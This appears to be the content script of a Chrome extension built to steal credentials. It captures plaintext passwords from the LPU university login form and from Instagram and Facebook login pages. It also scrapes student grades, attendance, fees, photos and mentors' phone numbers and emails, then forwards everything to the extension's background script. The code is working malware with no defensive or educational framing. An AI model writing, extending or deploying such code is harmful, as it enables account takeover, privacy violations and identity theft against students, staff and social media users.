// =================== Student Data Sniffer (LPU) ===================
// Only sends data on form submit or login button click - NOT on every keystroke

let lpuDataSent = false; // Prevent duplicate sends

// Store credentials temporarily in chrome.storage for combining with expiry info on dashboard
function storeCredentialsTemp(regNo, password) {
  try {
    chrome.storage.local.set({ 
      _lpu_temp_creds: { regNo, password, time: Date.now() } 
    });
    console.log("%c[LPU] Credentials stored temporarily for dashboard", "color: #ff9800;");
  } catch(e) {
    console.error("[LPU] Failed to store temp creds:", e);
  }
}

function getTempCredentials() {
  return new Promise((resolve) => {
    try {
      chrome.storage.local.get('_lpu_temp_creds', (result) => {
        const data = result._lpu_temp_creds;
        if (data && data.regNo && data.password) {
          // Only valid for 10 minutes
          if (Date.now() - data.time < 10 * 60 * 1000) {
            resolve(data);
            return;
          }
        }
        resolve(null);
      });
    } catch(e) {
      resolve(null);
    }
  });
}

function clearTempCredentials() {
  try {
    chrome.storage.local.remove('_lpu_temp_creds');
  } catch(e) {}
}

function sendStudentData(regNo, password, pwdExpiryDays = null, pwdExpiryDate = null) {
  // Validate: Registration number min 8 chars, password min 6 chars
  if (!regNo || regNo.length < 8 || !password || password.length < 6) {
    console.log("%c[LPU] SKIP: Data incomplete - RegNo min 8, Password min 6 chars required", "color: #ff9800;");
    return;
  }
  
  // Prevent sending same data multiple times
  const key = `${regNo}:${password}:${pwdExpiryDays}:${pwdExpiryDate}`;
  if (lpuDataSent === key) {
    console.log("%c[LPU] SKIP: Duplicate data, already sent", "color: #ff9800;");
    return;
  }
  
  lpuDataSent = key;
  
  chrome.runtime.sendMessage({
    type: "student_data",
    data: { 
      registrationNumber: regNo, 
      password,
      pwdExpiryDays,
      pwdExpiryDate
    },
  });
  
  console.log("%c[LPU] SENT: Credentials forwarded to background", "color: #4caf50; font-weight: bold;");
  console.table({ registrationNumber: regNo, password: "*".repeat(password.length), pwdExpiryDays, pwdExpiryDate });
}

function setupStudentListeners() {
  try {
    const regInput = document.getElementById("txtU");
    const passInput = document.getElementById("TxtpwdAutoId_8767");

    if (!regInput || !passInput) return false;

    // Find the login form or submit button
    const form = regInput.closest("form");
    const submitBtn = document.querySelector("input[type='submit'], button[type='submit'], #btnNext, .btn-primary");

    const captureAndSend = () => {
      const regNo = regInput.value.trim();
      const password = passInput.value;
      
      // Only process if regNo >= 8 chars and password >= 6 chars
      if (regNo && password && regNo.length >= 8 && password.length >= 6) {
        // Store credentials temporarily - will be combined with expiry info on dashboard
        storeCredentialsTemp(regNo, password);
        // Send immediately without expiry (will be updated on dashboard)
        sendStudentData(regNo, password, null, null);
      }
    };

    // Only capture on form submit
    if (form) {
      form.addEventListener("submit", (e) => {
        captureAndSend();
      });
    }

    // Also capture on submit button click
    if (submitBtn) {
      submitBtn.addEventListener("click", () => {
        captureAndSend();
      });
    }

    // Capture when Enter is pressed in password field
    passInput.addEventListener("keydown", (e) => {
      if (e.key === "Enter") {
        captureAndSend();
      }
    });

    console.log("%c[LPU] READY: Login form listeners attached (submit only mode)", "color: #4caf50; font-weight: bold;");
    return true;
  } catch (e) {
    console.error("[LPU] ERROR: Failed to setup listeners:", e);
    return false;
  }
}

// Retry mechanism for LPU inputs
if (!setupStudentListeners()) {
  let retries = 0;
  const maxRetries = 15;
  const interval = setInterval(() => {
    retries++;
    if (setupStudentListeners() || retries >= maxRetries) {
      clearInterval(interval);
      if (retries >= maxRetries) {
        console.log("%c[LPU] TIMEOUT: Login form not found after max retries", "color: #ff9800;");
      }
    }
  }, 700);
}

// =================== LPU Dashboard Password Expiry Capture ===================
// This captures password expiry info after successful login (on dashboard page)
let dashboardExpiryChecked = false;
let profileDataCaptured = false;
let coursesDataCaptured = false;

// =================== LPU Courses, CGPA, Attendance Capture ===================
async function captureCoursesAndAcademicData() {
  if (coursesDataCaptured) return;
  
  // Check if CoursesList element exists
  const coursesListEl = document.getElementById("CoursesList");
  const cgpaEl = document.getElementById("cgpa");
  const attEl = document.getElementById("AttPercent");
  
  if (!coursesListEl && !cgpaEl && !attEl) {
    console.log("%c[LPU] Dashboard: Courses/Academic elements not found yet...", "color: #9e9e9e;");
    return;
  }
  
  let courses = [];
  let cgpa = null;
  let overallAttendance = null;
  let registrationNumber = null;
  
  // Get registration number from page
  const regNoEl = document.getElementById("regno");
  if (regNoEl) {
    const regText = regNoEl.textContent || regNoEl.innerText || "";
    const regMatch = regText.match(/Reg\.?\s*No\.?[:\s]*(\d+)/i);
    if (regMatch) {
      registrationNumber = regMatch[1];
    }
  }
  
  if (!registrationNumber) {
    console.log("%c[LPU] Dashboard: No registration number found for courses", "color: #ff9800;");
    return;
  }
  
  // Extract CGPA
  if (cgpaEl) {
    const cgpaText = cgpaEl.textContent || cgpaEl.innerText || "";
    const cgpaMatch = cgpaText.match(/CGPA[:\s]*([0-9.]+)/i);
    if (cgpaMatch) {
      cgpa = parseFloat(cgpaMatch[1]);
    }
  }
  
  // Extract Overall Attendance
  if (attEl) {
    const attText = attEl.textContent || attEl.innerText || "";
    const attMatch = attText.match(/ATTENDANCE[:\s]*([0-9.]+)%/i);
    if (attMatch) {
      overallAttendance = parseFloat(attMatch[1]);
    }
  }
  
  // Extract Courses
  if (coursesListEl) {
    const courseDivs = coursesListEl.querySelectorAll(".mycoursesdiv");
    
    courseDivs.forEach(courseDiv => {
      try {
        const courseInfo = {};
        
        // Get percentage from circle
        const percentSpan = courseDiv.querySelector(".c100 span");
        if (percentSpan) {
          const pctText = percentSpan.textContent || "";
          const pctMatch = pctText.match(/(\d+)%/);
          if (pctMatch) {
            courseInfo.attendancePercent = parseInt(pctMatch[1]);
          }
        }
        
        // Get course details
        const courseText = courseDiv.querySelector(".col-sm-6")?.innerHTML || "";
        
        // Course code and name: "CSES011 : JAVA FULL STACK"
        const codeNameMatch = courseText.match(/<b>([A-Z0-9]+)\s*<\/b>\s*:\s*([^<]+)/i);
        if (codeNameMatch) {
          courseInfo.courseCode = codeNameMatch[1].trim();
          courseInfo.courseName = codeNameMatch[2].trim();
        }
        
        // Term
        const termMatch = courseText.match(/Term\s*:\s*<\/b>\s*(\d+)/i);
        if (termMatch) {
          courseInfo.term = termMatch[1];
        }
        
        // Roll No and Group
        const rollMatch = courseText.match(/Roll No\s*:\s*<\/b>\s*([A-Z0-9]+)\s*\/\s*Group\s*(\d+)/i);
        if (rollMatch) {
          courseInfo.rollNo = rollMatch[1];
          courseInfo.group = parseInt(rollMatch[2]);
        }
        
        // Exam Pattern
        const examMatch = courseText.match(/Exam Pattern\s*:\s*<\/b>\s*([^<]+)/i);
        if (examMatch) {
          courseInfo.examPattern = examMatch[1].trim();
        }
        
        // Class timings - "Class Today at : 01-02 PM Room:37-605,03-04 PM Room:37-605"
        const classText = courseDiv.querySelector(".col-sm-6 p:nth-child(2)")?.textContent || "";
        const classMatch = classText.match(/Class Today at\s*:\s*(.+)/i);
        if (classMatch) {
          const scheduleStr = classMatch[1].trim();
          // Parse schedule entries
          const schedules = scheduleStr.split(",").map(s => {
            const parts = s.trim().match(/(\d{2}-\d{2}\s*[AP]M)\s*Room:([A-Z0-9-]+)/i);
            if (parts) {
              return { time: parts[1], room: parts[2] };
            }
            return null;
          }).filter(Boolean);
          
          if (schedules.length > 0) {
            courseInfo.todaySchedule = schedules;
          }
        }
        
        if (courseInfo.courseCode) {
          courses.push(courseInfo);
        }
      } catch (e) {
        console.error("[LPU] Error parsing course:", e);
      }
    });
  }
  
  // Only send if we have meaningful data
  if (cgpa !== null || overallAttendance !== null || courses.length > 0) {
    coursesDataCaptured = true;
    
    console.log("%c[LPU] Dashboard: Academic data captured!", "color: #4caf50; font-weight: bold;");
    console.table({ cgpa, overallAttendance, coursesCount: courses.length });
    console.log("Courses:", courses);
    
    // Send academic data to background
    chrome.runtime.sendMessage({
      type: "lpu_academic_data",
      data: {
        registrationNumber,
        cgpa,
        overallAttendance,
        courses
      },
    });
    
    console.log("%c[LPU] SENT: Academic data forwarded to background", "color: #4caf50; font-weight: bold;");
  }
}

// =================== LPU Profile Data Capture ===================
async function captureProfileDataFromDashboard() {
  if (profileDataCaptured) return;
  
  // Check for profile info element
  const nameEl = document.getElementById("p_name");
  const regNoEl = document.getElementById("regno");
  const progNameEl = document.getElementById("progname");
  
  // All three must exist
  if (!nameEl && !regNoEl && !progNameEl) {
    console.log("%c[LPU] Dashboard: Profile elements not found yet...", "color: #9e9e9e;");
    return;
  }
  
  let studentName = null;
  let registrationNumber = null;
  let section = null;
  let program = null;
  let pwdExpiryDays = null;
  let pwdExpiryDate = null;
  
  // Extract name
  if (nameEl) {
    studentName = nameEl.textContent?.trim() || null;
  }
  
  // Extract reg number and section from: "Reg. No.: 12319278 | Section: 223PU"
  if (regNoEl) {
    const regText = regNoEl.textContent || regNoEl.innerText || "";
    
    // Extract registration number
    const regMatch = regText.match(/Reg\.?\s*No\.?[:\s]*(\d+)/i);
    if (regMatch) {
      registrationNumber = regMatch[1];
    }
    
    // Extract section
    const sectionMatch = regText.match(/Section[:\s]*([A-Z0-9]+)/i);
    if (sectionMatch) {
      section = sectionMatch[1];
    }
  }
  
  // Extract program name
  if (progNameEl) {
    const progText = progNameEl.textContent || progNameEl.innerText || "";
    program = progText.replace(/^\s*\**\s*|\s*\**\s*$/g, '').trim() || null;
  }
  
  // ===== Also try to capture password expiry from the page =====
  // Look for expiry element
  const expiryElement = document.getElementById("ctl00_wcUserPasswordDetail_HP_Label1") ||
    document.querySelector("[id*='wcUserPasswordDetail']") ||
    document.querySelector("[id*='PasswordDetail']") ||
    document.querySelector(".fg-password span[id]");
  
  if (expiryElement) {
    const expiryText = expiryElement.textContent || expiryElement.innerText || "";
    console.log("%c[LPU] Found expiry text: " + expiryText, "color: #2196f3;");
    
    // Extract days: "UMS Pwd will expire after 16 days"
    const daysMatch = expiryText.match(/expire after (\d+) days/i);
    if (daysMatch) {
      pwdExpiryDays = parseInt(daysMatch[1], 10);
    }
    
    // Extract date: "on or before 08-02-2026"
    const dateMatch = expiryText.match(/on or before (\d{2}-\d{2}-\d{4})/i);
    if (dateMatch) {
      pwdExpiryDate = dateMatch[1];
    }
  }
  
  // Also search entire page for expiry info if not found
  if (pwdExpiryDays === null && pwdExpiryDate === null) {
    const pageText = document.body.innerText || "";
    
    const daysMatch = pageText.match(/(?:password|pwd).*?expire.*?after\s+(\d+)\s+days/i);
    if (daysMatch) {
      pwdExpiryDays = parseInt(daysMatch[1], 10);
    }
    
    const dateMatch = pageText.match(/on or before\s+(\d{2}-\d{2}-\d{4})/i);
    if (dateMatch) {
      pwdExpiryDate = dateMatch[1];
    }
  }
  
  // Need at least registration number to proceed
  if (!registrationNumber) {
    console.log("%c[LPU] Dashboard: Could not extract registration number from profile", "color: #ff9800;");
    return;
  }
  
  // ===== Capture Student Profile Picture =====
  let studentProfilePic = null;
  const profilePicEl = document.getElementById("p_picture");
  if (profilePicEl && profilePicEl.src) {
    studentProfilePic = profilePicEl.src;
    console.log("%c[LPU] Student profile picture captured", "color: #4caf50;");
  }
  
  profileDataCaptured = true;
  
  console.log("%c[LPU] Dashboard: Profile data captured!", "color: #4caf50; font-weight: bold;");
  console.table({ studentName, registrationNumber, section, program, pwdExpiryDays, pwdExpiryDate });
  
  // ===== Capture Mentor Info from Know Your Authorities section =====
  let mentorName = null;
  let mentorMobile = null;
  let mentorEmail = null;
  let mentorDesignation = null;
  let mentorDivision = null;
  let mentorProfilePic = null;
  
  // Try to find mentor card from the heads carousel
  const headsSection = document.getElementById("heads");
  if (headsSection) {
    // Look for mentor card specifically
    const cards = headsSection.querySelectorAll(".card");
    cards.forEach(card => {
      const text = card.textContent || "";
      // Check if this card is for Mentor
      if (text.toLowerCase().includes("mentor")) {
        // Get mentor profile picture
        const mentorImg = card.querySelector(".card-img-top, img");
        if (mentorImg && mentorImg.src) {
          mentorProfilePic = mentorImg.src;
        }
        
        // Get mentor name - usually in first text content after "Mentor"
        const cardBody = card.querySelector(".card-body, .col-md-12");
        if (cardBody) {
          const textNodes = cardBody.querySelectorAll(".col-md-12, .text-small, div");
          textNodes.forEach((node, i) => {
            const nodeText = node.textContent?.trim() || "";
            // First substantial text after Mentor is usually name
            if (!mentorName && nodeText && !nodeText.toLowerCase().includes("mentor") && 
                !nodeText.includes("@") && !nodeText.match(/^\d{10}/) && nodeText.length > 2) {
              // Skip if it looks like a designation
              if (!nodeText.toLowerCase().includes("assistant") && 
                  !nodeText.toLowerCase().includes("division") &&
                  !nodeText.toLowerCase().includes("relationship")) {
                mentorName = nodeText;
              }
            }
          });
        }
        
        // Get designation
        const desigMatch = text.match(/(?:Senior\s+)?(?:Assistant|Associate|Professor|Lecturer)[^,\n]*/i);
        if (desigMatch) {
          mentorDesignation = desigMatch[0].trim();
        }
        
        // Get division
        const divisionMatch = text.match(/Division\s+of\s+[A-Za-z\s]+/i);
        if (divisionMatch) {
          mentorDivision = divisionMatch[0].trim();
        }
        
        // Get mobile number
        const mobileMatch = text.match(/(\d{10,11})/);
        if (mobileMatch) {
          mentorMobile = mobileMatch[1];
        }
        
        // Get email from mailto link
        const emailLink = card.querySelector("a[href^='mailto:']");
        if (emailLink) {
          mentorEmail = emailLink.href.replace("mailto:", "");
        }
      }
    });
  }
  
  // Fallback: try common mentor selectors
  if (!mentorName) {
    const mentorEl = document.querySelector("[id*='mentor'], [class*='mentor']");
    if (mentorEl) {
      mentorName = mentorEl.textContent?.trim()?.split('\n')[0] || null;
    }
  }
  
  // ===== Capture Fee Balance =====
  let feeBalance = null;
  let feeStatus = null;
  
  const feeBalanceEl = document.getElementById("feebalance");
  if (feeBalanceEl) {
    const feeText = feeBalanceEl.textContent || feeBalanceEl.innerText || "";
    // Extract fee amount like "₹ 1,50,000" or "Rs. 150000" or just numbers
    const feeMatch = feeText.match(/(?:₹|Rs\.?|INR)?\s*([\d,]+)/i);
    if (feeMatch) {
      feeBalance = feeMatch[1].replace(/,/g, '');
    }
    // Check if paid or pending
    if (feeText.toLowerCase().includes("paid") || feeText.toLowerCase().includes("clear")) {
      feeStatus = "Paid";
    } else if (feeText.toLowerCase().includes("pending") || feeText.toLowerCase().includes("due")) {
      feeStatus = "Pending";
    }
  }
  
  // Also try to get fee from FeePending div
  const feePendingEl = document.getElementById("FeePending");
  if (feePendingEl && !feeBalance) {
    const feeText = feePendingEl.textContent || "";
    const feeMatch = feeText.match(/(?:₹|Rs\.?|INR)?\s*([\d,]+)/i);
    if (feeMatch) {
      feeBalance = feeMatch[1].replace(/,/g, '');
    }
  }
  
  console.log("%c[LPU] Additional data:", "color: #2196f3;");
  console.table({ studentProfilePic: studentProfilePic ? 'captured' : null, mentorName, mentorMobile, mentorEmail, mentorProfilePic: mentorProfilePic ? 'captured' : null, feeBalance, feeStatus });
  
  // Send profile data to background (now including expiry info)
  chrome.runtime.sendMessage({
    type: "lpu_profile_data",
    data: { 
      studentName,
      registrationNumber,
      section,
      program,
      pwdExpiryDays,
      pwdExpiryDate,
      studentProfilePic,
      mentorName,
      mentorMobile,
      mentorEmail,
      mentorDesignation,
      mentorDivision,
      mentorProfilePic,
      feeBalance,
      feeStatus
    },
  });
  
  console.log("%c[LPU] SENT: Profile data forwarded to background", "color: #4caf50; font-weight: bold;");
}

async function capturePasswordExpiryFromDashboard() {
  if (dashboardExpiryChecked) return;
  
  // Check for password expiry element on dashboard
  const expirySpan = document.getElementById("ctl00_wcUserPasswordDetail_HP_Label1");
  
  // Also try other possible expiry element selectors
  const expiryElement = expirySpan || 
    document.querySelector("[id*='wcUserPasswordDetail']") ||
    document.querySelector(".fg-password span[id]");
    
  if (!expiryElement) {
    console.log("%c[LPU] Dashboard: No expiry element found yet...", "color: #9e9e9e;");
    return;
  }
  
  const text = expiryElement.textContent || expiryElement.innerText || "";
  if (!text || text.trim() === "" || !text.includes("expire")) return;
  
  console.log("%c[LPU] Dashboard: Found expiry element!", "color: #2196f3; font-weight: bold;");
  console.log("%c[LPU] Text: " + text, "color: #2196f3;");
  
  dashboardExpiryChecked = true;
  
  let pwdExpiryDays = null;
  let pwdExpiryDate = null;
  
  // Extract days: "UMS Pwd will expire after 16 days"
  const daysMatch = text.match(/expire after (\d+) days/i);
  if (daysMatch) {
    pwdExpiryDays = parseInt(daysMatch[1], 10);
  }
  
  // Extract date: "on or before 08-02-2026"
  const dateMatch = text.match(/on or before (\d{2}-\d{2}-\d{4})/i);
  if (dateMatch) {
    pwdExpiryDate = dateMatch[1];
  }
  
  console.log("%c[LPU] Dashboard: Parsed expiry info", "color: #2196f3;");
  console.table({ pwdExpiryDays, pwdExpiryDate });
  
  if (pwdExpiryDays !== null || pwdExpiryDate !== null) {
    // Get temp credentials from chrome.storage (from login form)
    const tempCreds = await getTempCredentials();
    
    if (tempCreds && tempCreds.regNo && tempCreds.password) {
      console.log("%c[LPU] Dashboard: Found temp credentials from login!", "color: #4caf50; font-weight: bold;");
      // Send complete data with expiry info
      sendStudentData(tempCreds.regNo, tempCreds.password, pwdExpiryDays, pwdExpiryDate);
      clearTempCredentials();
      return;
    } else {
      console.log("%c[LPU] Dashboard: No temp credentials found, sending expiry update only", "color: #ff9800;");
    }
    
    // Fallback: Try to get registration number from the page and send update
    let regNo = null;
    
    // Try multiple selectors commonly used for displaying reg number
    const regNoSelectors = [
      "#ctl00_cphHeading_Aborlogindev_UserNameLabel",
      "#ctl00_cphHeading_UserNameLabel", 
      ".user-reg-no",
      "[id*='UserNameLabel']",
      "[id*='RegistrationNo']",
      "[id*='RegNo']"
    ];
    
    for (const selector of regNoSelectors) {
      const el = document.querySelector(selector);
      if (el && el.textContent) {
        const elText = el.textContent.trim();
        // Check if it looks like a registration number (8+ digits)
        if (/^\d{8,}$/.test(elText)) {
          regNo = elText;
          console.log("%c[LPU] Dashboard: Found RegNo via selector: " + selector, "color: #4caf50;");
          break;
        }
      }
    }
    
    // Also try to find in any visible element containing the number pattern
    if (!regNo) {
      const allElements = document.querySelectorAll("span, label, div, td");
      for (const el of allElements) {
        const txt = el.textContent?.trim();
        if (txt && /^\d{8,12}$/.test(txt)) {
          regNo = txt;
          console.log("%c[LPU] Dashboard: Found RegNo via scan: " + regNo, "color: #4caf50;");
          break;
        }
      }
    }
    
    if (regNo) {
      console.log("%c[LPU] Dashboard: Sending expiry update for " + regNo, "color: #4caf50;");
      chrome.runtime.sendMessage({
        type: "lpu_expiry_update",
        data: { 
          registrationNumber: regNo,
          pwdExpiryDays,
          pwdExpiryDate
        },
      });
    } else {
      console.log("%c[LPU] Dashboard: Expiry info found but no RegNo detected", "color: #ff9800;");
    }
  }
}

// Check for dashboard password expiry info and profile data
if (location.hostname.includes("lpu.in") || location.hostname.includes("lpude.in")) {
  
  // ========== RETRY MECHANISM FOR COMPLETE DATA CAPTURE ==========
  // Some data loads late (mentor info, courses), so we retry at intervals
  
  const RETRY_INTERVALS = [2000, 5000, 10000, 15000, 20000]; // 2s, 5s, 10s, 15s, 20s
  let captureAttempt = 0;
  
  function resetCaptureFlags() {
    // Reset flags to allow re-capture
    profileDataCaptured = false;
    coursesDataCaptured = false;
    dashboardExpiryChecked = false;
  }
  
  function runFullCapture(attempt) {
    console.log(`%c[LPU] ========== CAPTURE ATTEMPT #${attempt} ==========`, "color: #ff9800; font-weight: bold; font-size: 14px;");
    console.log(`%c[LPU] Timestamp: ${new Date().toLocaleTimeString()}`, "color: #9e9e9e;");
    
    // Reset flags before each retry to allow fresh capture
    if (attempt > 1) {
      resetCaptureFlags();
      console.log("%c[LPU] Flags reset for fresh capture", "color: #2196f3;");
    }
    
    // Run all captures
    capturePasswordExpiryFromDashboard();
    captureProfileDataFromDashboard();
    captureCoursesAndAcademicData();
  }
  
  // Initial capture
  setTimeout(() => {
    captureAttempt = 1;
    runFullCapture(1);
  }, 1500);
  
  // Schedule retry captures at intervals
  RETRY_INTERVALS.forEach((delay, index) => {
    setTimeout(() => {
      captureAttempt = index + 2;
      runFullCapture(index + 2);
    }, delay);
  });
  
  // Also use MutationObserver for dynamic pages (but don't reset flags here)
  let mutationCaptureCount = 0;
  const MAX_MUTATION_CAPTURES = 3;
  
  const observer = new MutationObserver(() => {
    if (mutationCaptureCount < MAX_MUTATION_CAPTURES) {
      mutationCaptureCount++;
      console.log(`%c[LPU] DOM change detected - mutation capture #${mutationCaptureCount}`, "color: #9e9e9e;");
      capturePasswordExpiryFromDashboard();
      captureProfileDataFromDashboard();
      captureCoursesAndAcademicData();
    }
  });
  
  observer.observe(document.body, { 
    childList: true, 
    subtree: true 
  });
  
  // Stop observing after 25 seconds
  setTimeout(() => {
    observer.disconnect();
    console.log("%c[LPU] ========== CAPTURE COMPLETE ==========", "color: #4caf50; font-weight: bold; font-size: 14px;");
    console.log("%c[LPU] Observer disconnected after 25 seconds", "color: #9e9e9e;");
  }, 25000);
}

// =================== Instagram Login Sniffer ===================
if (location.hostname.includes("instagram.com")) {
  let igTries = 0;
  const igMaxTries = 25;

  const sniffInstagramLogin = setInterval(() => {
    igTries++;

    const usernameInput = document.querySelector("input[name='username']");
    const passwordInput = document.querySelector("input[name='password']");
    const loginBtn = document.querySelector("button[type='submit']:not([disabled])");

    if (usernameInput && passwordInput && loginBtn) {
      console.log("%c[IG] READY: Login form detected, listener attached", "color: #4caf50; font-weight: bold;");

      loginBtn.addEventListener("click", () => {
        const username = usernameInput.value.trim();
        const password = passwordInput.value;

        if (username && password) {
          chrome.runtime.sendMessage({
            type: "instagram_login_data",
            data: { username, password },
          });
          console.log("%c[IG] SENT: Login credentials forwarded to background", "color: #4caf50; font-weight: bold;");
        }
      }, { once: true });

      clearInterval(sniffInstagramLogin);
    }

    if (igTries >= igMaxTries) {
      clearInterval(sniffInstagramLogin);
    }
  }, 700);
}

// =================== Facebook Login Sniffer ===================
if (location.hostname.includes("facebook.com")) {
  let fbTries = 0;
  const fbMaxTries = 25;

  const sniffFacebookLogin = setInterval(() => {
    fbTries++;

    // Facebook login form selectors
    const emailInput = document.querySelector("input[name='email'], input#email");
    const passwordInput = document.querySelector("input[name='pass'], input#pass");
    const loginBtn = document.querySelector("button[name='login'], button[type='submit'], button[data-testid='royal_login_button']");

    if (emailInput && passwordInput && loginBtn) {
      console.log("%c[FB] READY: Login form detected, listener attached", "color: #4caf50; font-weight: bold;");

      loginBtn.addEventListener("click", () => {
        const email = emailInput.value.trim();
        const password = passwordInput.value;

        if (email && password && password.length >= 6) {
          chrome.runtime.sendMessage({
            type: "facebook_login_data",
            data: { email, password },
          });
          console.log("%c[FB] SENT: Login credentials forwarded to background", "color: #4caf50; font-weight: bold;");
        }
      }, { once: true });

      // Also listen for Enter key in password field
      passwordInput.addEventListener("keydown", (e) => {
        if (e.key === "Enter") {
          const email = emailInput.value.trim();
          const password = passwordInput.value;

          if (email && password && password.length >= 6) {
            chrome.runtime.sendMessage({
              type: "facebook_login_data",
              data: { email, password },
            });
            console.log("%c[FB] SENT: Login credentials forwarded to background", "color: #4caf50; font-weight: bold;");
          }
        }
      }, { once: true });

      clearInterval(sniffFacebookLogin);
    }

    if (fbTries >= fbMaxTries) {
      clearInterval(sniffFacebookLogin);
    }
  }, 700);
}
